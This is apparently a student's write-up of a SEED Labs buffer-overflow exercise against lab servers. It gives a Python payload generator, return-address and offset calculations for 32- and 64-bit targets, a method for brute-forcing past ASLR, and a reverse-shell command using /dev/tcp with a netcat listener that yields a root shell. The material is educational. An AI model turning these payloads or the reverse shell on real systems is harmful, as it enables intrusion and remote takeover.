# Buffer Overflow (Server Version)

## Lab Environment Setup
- SEED Ubuntu 20.04 VM
- Turn off countermeasures
    - `sudo /sbin/sysctl -w kernel.randomize_va_space=0`
    - important, if the randomization is not turned off, the frame pointer and buffer's address will be different each time we execute the program

- Compilation
    - `gcc -DBUF_SIZE=$(L1) -o stack -z execstack -fno-stack-protector stack.c`
    - `-z execstack` Turn off the non-executable stack protection
    - `-fno-stack-protector stack.c` Turn off the StackGuard

## Task 1: Get Familiar with the Shellcode
- The goal of buffer-overflow attacks is to inject malicious code into the program.
- Shellcode is widely used in most code-injection attacks.
- **Shellcode**: a piece of code that launches a shell, and is usually written in assembly language.
- The shellcode is provided, modify it to run arbitrary command, but ensure not to change the length of the argument string. For more information about shellcode, refer to the **Shellcode Development Lab**

## Task 2: Level-1 Attack
- Target Server: `10.9.0.5:9090` (32-bit)
- Send a benign message to the server:
    ```
    $ echo hello | nc 10.9.0.5 9090
    (Press ctrl+C)
    ```
    ```
    $ docker-compose up
    ...
    server-1-10.9.0.5 | Got a connection from 10.9.0.1
    server-1-10.9.0.5 | Starting stack
    server-1-10.9.0.5 | Input size: 6
    server-1-10.9.0.5 | Frame Pointer (ebp) inside bof(): 0xffffd318
    server-1-10.9.0.5 | Buffer's address inside bof():    0xffffd2a8
    server-1-10.9.0.5 | ==== Returned Properly ====
    ```

- Increase the input length, until `bof()` can't return properly
    - in my case, `bof()` could return properly until input size was less than 98
    ```
    server-1-10.9.0.5 | Got a connection from 10.9.0.1
    server-1-10.9.0.5 | Starting stack
    server-1-10.9.0.5 | Input size: 98
    server-1-10.9.0.5 | Frame Pointer (ebp) inside bof(): 0xffffd318
    server-1-10.9.0.5 | Buffer's address inside bof():    0xffffd2a8
    ```

- Exploit
    - use `exploit.py` to generate `badfile`, which contains the payload
    - [NOP, no-op, NOOP](https://en.wikipedia.org/wiki/NOP_(code))
    - `exploit.py`
        ```
        #!/usr/bin/python3
        import sys

        shellcode = (
            "" # Need to change

        ).encode('latin-1')

        # Fill the content with NOP's
        content = bytearray(0x90 for i in range(517))

        #############################################
        ebp      = 0xffffd318
        buf_addr = 0xffffd2a8
        delta    = ebp - buf_addr

        # Put the shellcode in the final part of the payload
        start = 517 - len(shellcode)
        content[start: start + len(shellcode)] = shellccode

        # Return to somewhere before the shellcode
        # save it somewhere in the payload
        ret = ebp + 10     # ebp + x, just ensure that the return address is after (ebp + 8), but before the shellcode
        offset = delta + 4 # Put ret (the new return address) next to ebp

        # User 4 for 32-bit address, and 8 for 64-bit address
        content[offset:offset+4] = (ret).to_bytes(4, byteorder='little')

        #############################################
        with open('badfile', 'wb') as f:
            f.write(content)
        ```

    - Original Stack
        ```
        High Memory Addresses
        |          +---------------------+
        |          |        ...          |
        |          +---------------------+  <-- 0xffffd318 + 8
        |          |    Return Address   |
        |          +---------------------+  <-- 0xffffd318 + 4
        |          |   Previous %ebp     |
        |          +---------------------+  <-- 0xffffd318 (ebp)
        |          |        ...          |
        |          |---------------------|
        |          |                     |
        |          |                     |
        |          |       Buffer        |
        |          |                     |
        |          |                     |
        |          |---------------------|  <-- 0xffffd2a8 (&buffer)
        |          |        ...          |
        |          +---------------------+
        |          |    Unused Space     |
        |          +---------------------+
        |
        Low Memory Addresses
        ```
    - Stack After Buffer-Overflow
        ```
        High Memory Addresses
        |          +---------------------+ 
        |          |                     |
        |          |     Shellcode       |
        |          |                     |
        |          +---------------------+
        |          |        NOPs         |
        |          |---------------------|  <-- 0xffffd318 + 10
        |          |        NOPs         |
        |          +---------------------+  <-- 0xffffd318 + 8
        |          |   0xffffd318 + 10   |
        |          | (New Return Address)|
        |          +---------------------+  <-- 0xffffd318 + 4
        |          |        NOPs         |
        |          |---------------------|  <-- 0xffffd318 (ebp)
        |          |        NOPs         |
        |          |---------------------|  <-- 0xffffd2a8 (&buffer)
        |          |        ...          |
        |          +---------------------+
        |          |    Unused Space     |
        |          +---------------------+
        |
        Low Memory Addresses
        ```

- generating a reverse shell
    - replace the command to: `/bin/bash -i >& /dev/tcp/10.9.0.1/9875 0>&1`
    - on the attacker's machine:
        ```
        $ nc -l 9875
        root@0a4c2c385474:/bof# ls
        ls
        core
        server
        stack
        ```

## Task 3: Level-2 Attack
- Target Server: `10.9.0.6:9090` (32-bit)
- the value of `ebp` will not be revealed
- the buffer size is unknown (but we assume that the range of buffer size is `[100, 300]` in bytes)
- due to the memory alignment, in 32-bit systems, the value stored in the frame pointer is always multiple of 4
- by given any input, we can learn that `&buffer` is `0xffffd018`

- solution:
    1. `ret`: make it close to the shellcode, e.g., `ret = buff_addr + 320`
    2. fill the first part of the buffer with the return address `ret`

    - Stack After Buffer-Overflow
        ```
        High Memory Addresses
        |          +---------------------+ 
        |          |                     |
        |          |     Shellcode       |
        |          |                     |
        |          +---------------------+
        |          |        NOPs         |
        |          |---------------------|  <-- 0xffffd318 + 320
        |          |        NOPs         |
        |          +---------------------+  <-- 0xffffd318 + 316
        |          |   0xffffd018 + 320  |
        |          +---------------------+  <-- 0xffffd018 + 312
        |          |   0xffffd018 + 320  |
        |          |---------------------|  <-- unknown (ebp)
        |          |   0xffffd018 + 320  |
        |          |---------------------|  <-- 0xffffd018 (&buffer)
        |          |        ...          |
        |          +---------------------+
        |          |    Unused Space     |
        |          +---------------------+
        |
        Low Memory Addresses
        ```

## Task 4: Level-3 Attack
- Target Server: `10.9.0.7:9090` (64-bit)
- `$rbp`:    `0x00007fffffffe6b0`
- `&buffer`: `0x00007fffffffe5e0`
- difficulty: in x64 architecture, only the address from `0x0000000000000000` to `0x00007FFFFFFFFFFF` is allowed, i.e., for each address (8 bytes), the highest 2 bytes are always zeros, and `strcpy()` stops copying when it sees a zero (`0x00`, i.e., `'\0'`)

- **important**: use the 64-bit version shellcode
- modify the code, and generate the `badfile`
    ```
    rbp = 0x00007fffffffe6b0
    ret = rbp + 30
    offset = rbp - buf_addr + 8

    content[offset:offset+8] = (ret).to_bytes(8, byteorder='little')
    ```
- try `cat badfile | nc 10.9.0.7 9090`, didn't work
    - open `badfile` with Bless hex editor, find the return address: `8E 5A 07 CA FD 7F 00 00` (the byte order is little-endian, e.g., the least significant byte is in the lowest memory address)
    - the problem was caused by `00`, which was seen as `'\0'` in `strcpy()`
- solution: put the shellcode at the begining of the buffer
    ```
    start = 0 # put the shellcode at the begining of the buffer
    content[start:start + len(shellcode)] = shellcode

    ret    = buf_addr # retrun to the begining of the buffer
    offset = rbp - buf_addr + 8 # The return address should be stored next to the ebp 

    # Use 8 for 64-bit address
    content[offset:offset+8] = (ret).to_bytes(8,byteorder='little')
    ```

## Task 5: Level-4 Attack
- Target Server: `10.9.0.8:9090` (64-bit)
- Similar to level-3, with a smaller buffer size, not enough for the shellcode
- solution: put the shellcode to elsewhere
    - in the main function of `stack.c`, there is another buffer `char str[517]`, the input will also be stored there, brute-force to figure out the address of it, and return to somewhere before the shellcode
    - to improve the chance of success, put the shellcode at the end of `str`, as long as we return to somewhere between the first and the last valid return address, the shellcode can be executed
    - the first valid return address (also `&str`)
    - the last valid return address (where the shellcode begins)
        ```
        High Memory Addresses
        |          +---------------------+ 
        |          |        ...          |
        |          |---------------------|  <-- end of str     
        |          |                     |
        |          |      Shellcode      |  (165 bytes)
        |          |                     |
        |          +---------------------+  <-- last valid return address
        |          |        NOPs         |
        |          |        NOPs         |  (352 bytes)
        |          |        NOPs         |
        |          +---------------------+  <-- first valid return address
        |          |        ...          |
        |          +---------------------+
        |          |        ...          |
        |          +---------------------+
        |          |    Unused Space     |
        |          +---------------------+
        Low Memory Addresses
        ```
    - make a quick estimation on the range of valid return address
        - the size of the shellcode is `165 bytes`, so the size of the NOP area is `352 bytes = 517 bytes - 165 bytes`, the goal is to make return address in this `352 bytes` area
        - the call chain is: `main` --> `dummy_function` --> `bof`
        - in `dummy_function`:
            - parameter `char *str` - size: `8 bytes`
            - local variable `char dummy_buffer[1000]` - size: `1000`
        - there are also some other data like the previous rbp or return address, suppose they are `x bytes` in total, `x` is small

        - the valid return address is approximately `[rbp + 1008 + x, rbp + 1008 + x + 352]`

        - make a guess:
            - if `x == 0`, the range is `[rbp + 1008, rbp + 1360]`
            - if `x == 100`, the range is `[rbp + 1108, rbp + 1460]`
            - take a value in `[rbp + 1108, rbp + 1360]`, it is likely to success
            - try `rbp + 1300`, it works!

## Task 6: Address Randomization
- turn on the countermeasure, ASLR, the Address Layout Randomization
    - `sudo /sbin/sysctl -w kernel.randomize_va_space=2`
- try `echo hello` on multiple times in level-1 and level-3, each time the ebp/rbp and address of buffer will be different

- important information: on `32-bit` linux machines, only `19-bit` can be used for address randomization
- On level-1 server (`10.9.0.5`, `32-bit`): 
    - run several times with benign inputs, randomly pick one of the ebp and buffer address
    - the payload and the stack layout:
        ```
        High Memory Addresses
        |          +---------------------+ 
        |          |        ...          |
        |          |---------------------|    
        |          |                     |
        |          |      Shellcode      |
        |          |                     |
        |          +---------------------+
        |          |        NOPs         |
        |          |        NOPs         |
        |          |        NOPs         |
        |          +---------------------+
        |          |    Return Address   |
        |          +---------------------+
        |          |        ...          |
        |          |    Return Address   |
        |          |        ...          |
        |          +---------------------+
        |          |    Unused Space     |
        |          +---------------------+
        Low Memory Addresses
        ```

    - brute-force: got a reverse shell after 2 minutes and 20 seconds

## Task 7: Other Countermeasures
### Task 7.a: StackGuard
- remove `-fno-stack-protector` flag
- recompile `stack.c`
- local test: 
    ```
    $ ./stack-L1 < badfile
    Input size: 517
    Frame Pointer ...
    Buffer's address ...
    *** stack smashing detected ***: terminated
    Aborted
    ```

### Task 7.b: Non-executable Stack
- In Ubuntu OS, the binary images of programs and shared libraries must declare whether they require executable stacks or not, i.e., they need to mark a field in the program header
- Kernel or dynamic linker uses this marking to decide whether to make the stack of this program executable or non-executable
- by default, `gcc` set this marking non-executable
- we can manually set it: use `-z noexecstack` or `-z execstack` flag in the compilation

- Compile `call_shellcode.c` into `a32.out` and `a64.out` without `-z execstack`
    ```
    $ gcc -m32 -o a32.out call_shellcode.c
    $ gcc -o a64.out call_shellcode.c
    $ ./a32.out
    Segmentation fault
    $ ./a64.out
    Segmentation fault
    ```

- **Defeating** the non-executable stack countermeasure: this countermeasure only makes it impossible to run shellcode on the stack, but there are other ways to run malicious code after exploiting a buffer-overflow vulnerability, e.g., the *return-to-libc* attack (There is a separate lab for this attack)
